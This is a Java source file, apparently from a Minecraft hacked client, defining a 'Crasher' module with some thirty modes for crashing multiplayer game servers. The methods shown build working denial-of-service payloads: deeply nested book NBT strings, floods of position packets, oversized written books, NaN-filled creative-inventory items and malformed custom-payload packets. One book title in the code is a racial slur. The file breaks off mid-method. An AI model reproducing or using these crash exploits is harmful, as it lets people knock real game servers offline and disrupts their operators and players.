package me.bratwurst.module.modules.Crasher;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import de.Hero.settings.Setting;
import io.netty.buffer.Unpooled;
import me.bratwurst.Client;
import me.bratwurst.event.EventTarget;
import me.bratwurst.event.events.EventMotionUpdate;
import me.bratwurst.module.Category;
import me.bratwurst.module.Module;
import me.bratwurst.utils.TimeHelper;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumChatFormatting;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;

public class Crasher extends Module {
    public Setting Packets, Bypass, Range, MoveFix;
    public static Setting mode1;

    public Crasher() {
        super("Crasher", Category.EXPLOIT);
        ArrayList<String> options = new ArrayList<>();
        options.add("ServerCrash");
        options.add("Singlepacket");
        options.add("Fly");
        options.add("Exploitfix");
        options.add("Netty");
        options.add("Newsinglepacket");
        options.add("Bookcrah");
        options.add("Commandcrash");
        options.add("Creative");
        options.add("Custompayload");
        options.add("CustomPlayload2");
        options.add("Firework");
        options.add("Respawn");
        options.add("Item");
        options.add("Item2");
        options.add("Labymod");
        options.add("Labyfucker");
        options.add("Spam");
        options.add("Pex");
        options.add("Position");
        options.add("Entity");
        options.add("head");
        options.add("Place");
        options.add("Newbook");
        options.add("worldeditcrash");
        options.add("Zerosmash");
        options.add("Packetflood");
        options.add("AuthmeCrash");
        options.add("CustomByte");
        options.add("Mineplex");




        Client.setmgr.rSetting(mode1 = new Setting("Crasher Mode", this, "Singlepacket", options));
    }

    @Override
    public void setup() {

        Client.setmgr.rSetting(Packets = new Setting("Packets", this, 10, 1, 50, false));

    }

    @EventTarget
    public void onUpdate(EventMotionUpdate e) {
        if (Minecraft.getMinecraft().getNetHandler().getNetworkManager().getRemoteAddress().equals("astrogames.net/45.132.89.229:25565")) {

            PlayerUtils.sendMessage("Dieser Server Darf nicht gecrasht werden LG Bratwurst001");
            return;
        }

        PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Bypass mode Ativiert", true);
        if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
            Singlepacket();
        } else if (mode1.getValString().equalsIgnoreCase("Massivechunkloading")) {
            ServerCrash();
        } else if (mode1.getValString().equalsIgnoreCase("Fly")) {
            Flycrasher();
        } else if (mode1.getValString().equalsIgnoreCase("Exploitfix")) {
            Exploitfix();
        } else if (mode1.getValString().equalsIgnoreCase("Netty")) {
            Netty();
        } else if (mode1.getValString().equalsIgnoreCase("Newsinglepacket")) {
            Newsinglepacket();
        } else if (mode1.getValString().equalsIgnoreCase("Bookcrah")) {
            Bookcrah();
        } else if (mode1.getValString().equalsIgnoreCase("Commandcrash")) {
            Commandcrash();
        } else if (mode1.getValString().equalsIgnoreCase("Creative")) {
            Creative();
        } else if (mode1.getValString().equalsIgnoreCase("Custompayload")) {
            Custompayload();
        } else if (mode1.getValString().equalsIgnoreCase("CustomPlayload2")) {
            CustomPlayload2();
        } else if (mode1.getValString().equalsIgnoreCase("Firework")) {
            Firework();

        } else if (mode1.getValString().equalsIgnoreCase("Respawn")) {
            Respawn();
        } else if (mode1.getValString().equalsIgnoreCase("Item")) {
            Item();
        } else if (mode1.getValString().equalsIgnoreCase("Item2")) {
            Item2();
        } else if (mode1.getValString().equalsIgnoreCase("Labymod")) {
            Labymod();
        } else if (mode1.getValString().equalsIgnoreCase("Labyfucker")) {
            Laby2();
        } else if (mode1.getValString().equalsIgnoreCase("Spam")) {
            Spam();
        } else if (mode1.getValString().equalsIgnoreCase("Pex")) {
            Pex();
        } else if (mode1.getValString().equalsIgnoreCase("Position")) {
            Position();
        } else if (mode1.getValString().equalsIgnoreCase("Entity")) {
            Entity();
        } else if (mode1.getValString().equalsIgnoreCase("head")) {
            head();
        } else if (mode1.getValString().equalsIgnoreCase("Place")) {
            Place();
        }else if (mode1.getValString().equalsIgnoreCase("Newbook")) {
            newcrashb();
        }else if (mode1.getValString().equalsIgnoreCase("worldeditcrash")) {
                 Worledit();
        }else if (mode1.getValString().equalsIgnoreCase("Zerosmash")) {
                 Zerosmash();
        }else if (mode1.getValString().equalsIgnoreCase("Packetflood"))  {
           Packetflood();
        }else if (mode1.getValString().equalsIgnoreCase("AuthmeCrash")) {
         AuthmeCrash();
        }else if (mode1.getValString().equalsIgnoreCase("CustomByte")) {
            Custombyte();
        }else if (mode1.getValString().equalsIgnoreCase("Mineplex")) {
            MinePlex();
        }


    }

    public void Singlepacket() {
        PlayerUtils.sendMessage(EnumChatFormatting.RED + "Crashing....");
        NBTTagCompound comp = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        String row = "{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}";
        list.appendTag((NBTBase) new NBTTagString(row));
        comp.setString("author", randomNumber(50));
        comp.setString("title", "Crashed by GODClient");
        comp.setByte("resolved", (byte) 1);
        comp.setTag("pages", (NBTBase) list);
        ItemStack stack = new ItemStack(Items.writable_book);
        stack.setTagCompound(comp);
        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        buffer.writeItemStackToBuffer(stack);
        Packet<?> pack = null;
        for (int i = 0; i < 50; i++) {
            C17PacketCustomPayload cPacketCustomPayload;
            ((Minecraft.getMinecraft()).thePlayer.sendQueue.getNetworkManager()).channel.writeAndFlush(cPacketCustomPayload = new C17PacketCustomPayload("MC|BEdit", buffer));
        }
        toggle();
    }

    public static String randomNumber(int length) {
        return random(length, "123456789");
    }

    public static String random(int length, String chars) {
        return random(length, chars.toCharArray());
    }

    public static String random(int length, char[] chars) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; i++)
            stringBuilder.append(chars[(new Random()).nextInt(chars.length)]);
        return stringBuilder.toString();
    }

    public void ServerCrash() {
        if (mc.isSingleplayer()) {

            return;
        }
        double playerX = mc.thePlayer.posX;
        double playerY = mc.thePlayer.posY;
        double playerZ = mc.thePlayer.posZ;
        double y = 0;
        double x = 0;
        double z = 0;
        for(int i = 0; i < 2000;) {
            y = i * 9;
            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
            i++;
        }
        for(int i = 0; i < 10000;) {
            z = i * 9;
            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
            i++;
        }
    }

    public void Flycrasher() {
        for (int i = 0; i < Packets.getValInt(); i++) {

            double itm = mc.thePlayer.posX;
            double o = mc.thePlayer.posY;
            double playerZ = mc.thePlayer.posZ;
            double y = 0.0D;
            double x = 0.0D;
            double z = 0.0D;
            int i1;
            y = (i * 9);
            (mc.getNetHandler().getNetworkManager()).channel.writeAndFlush(new C03PacketPlayer.C04PacketPlayerPosition(itm, i + y, playerZ, false));
            for (i1 = 0; i1 < 10000; i1++) {
                z = (i1 * 9);

                (mc.getNetHandler().getNetworkManager()).channel.writeAndFlush(new C03PacketPlayer.C04PacketPlayerPosition(itm, i + y, playerZ + z, false));
            }

        }
    }

    public void Exploitfix() {
        Minecraft mc = Minecraft.getMinecraft();
        for (int index = 0; index < 999; ++index) {
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 500000 * index,
                    mc.thePlayer.getEntityBoundingBox().minY + 500000 * index,
                    mc.thePlayer.posZ + 500000 * index, true));
        }
        toggle();
    }


    public void Netty() {
        for (int i2 = 0; i2 < 50; i2++) {
            ItemStack book = new ItemStack(Items.writable_book);
            String author = "Netty" + (new Random()).nextInt(50);
            String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
            NBTTagCompound tag = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            for (int i3 = 0; i3 < 340; i3++) {
                NBTTagString tString = new NBTTagString(size);
                list.appendTag((NBTBase) tString);
            }
            tag.setString("author", author);
            tag.setString("title", "");
            tag.setTag("pages", (NBTBase) list);
            if (book.hasTagCompound()) {
                NBTTagCompound tagb = book.getTagCompound();
                tagb.setTag("pages", (NBTBase) list);
            } else {
                book.setTagInfo("pages", (NBTBase) list);
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX, (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ), 1, book, 0.0F, 0.0F, 0.0F));
        }
    }

    public void Newsinglepacket() {
        ItemStack book = new ItemStack(Items.writable_book);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();

        String size = "blzqbuvjxvmswphhwenqgufshaiughkashkjghsakjhkjrjajhfkshakhgayhoahiuwfhawfhshafhas, fsaghgasjkgsabkjkfjnsahbfkjsahlkfhsa,sfjkahkfhsajgasj, hgfsajkhgjashghsaghaskhjgfas , oshgahgashgashgas, 85973198F(&S^A&(YR#@YA(6d978A(SYF(S^A(GAShc(SH(GFSA^(G&ASOHVSA&FGSA(GOIASSA&FG)US)GUSAJCSAY)GUS)(AUGS)CSAYG)SAU)CINSA)(YGSAY)CNSA)(HG()SYCSACHKSAHF(^&(^(F^SA(^(^(SF^(SA^(^(^(FSA^(^(RS(A^($^(Q#^($^Q(*^";

        for (int i = 0; i < 300; i++) {
            String siteContent = size;
            NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }
        tag.setString("author", "zBrutal96");
        tag.setString("title", "STFU YOONIKS");
        tag.setTag("pages", list);
        book.setTagInfo("pages", list);
        book.setTagCompound(tag);

    }

    public void Bookcrah() {
        try {
            ItemStack book = new ItemStack(Items.writable_book);
            String author = Minecraft.getMinecraft().getSession().getUsername();
            String title = "Nigger";
            String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            NBTTagCompound tag = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            for (int i2 = 0; i2 < 50; i2++) {
                String siteContent = size;
                NBTTagString tString = new NBTTagString(siteContent);
                list.appendTag((NBTBase) tString);
            }
            tag.setString("author", author);
            tag.setString("title", title);
            tag.setTag("pages", (NBTBase) list);
            book.setTagInfo("pages", (NBTBase) list);
            book.setTagCompound(tag);
            while (true) {
                if (TimeHelper.hasReached(10)) {
                    Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C10PacketCreativeInventoryAction(2147483647, book));
                }


            }
        } catch (Exception exception) {
            return;
        }
    }

    public void Commandcrash() {
        if (TimeHelper.hasReached(10)) {

            PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
            packetbuffer.writeLong(Long.MAX_VALUE);
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
        }

    }

    public void Creative() {
        ItemStack itm = new ItemStack(Block.getBlockById(Integer.valueOf(1)));
        NBTTagCompound base = new NBTTagCompound();
        int i;
        for (i = 0; i < 30000; i++)
            base.setDouble(String.valueOf(i), Double.NaN);
        itm.setTagCompound(base);
        for (i = 0; i < 40; i++)
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(i, itm));
       toggle();
    }
public static int Timer = 0;
    public void Custompayload() {
        if (TimeHelper.hasReached(1000)) {

            for (int index = 0; index < 3333; ++index){
                Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                        Minecraft.getMinecraft().thePlayer.posX + 9412 * index,
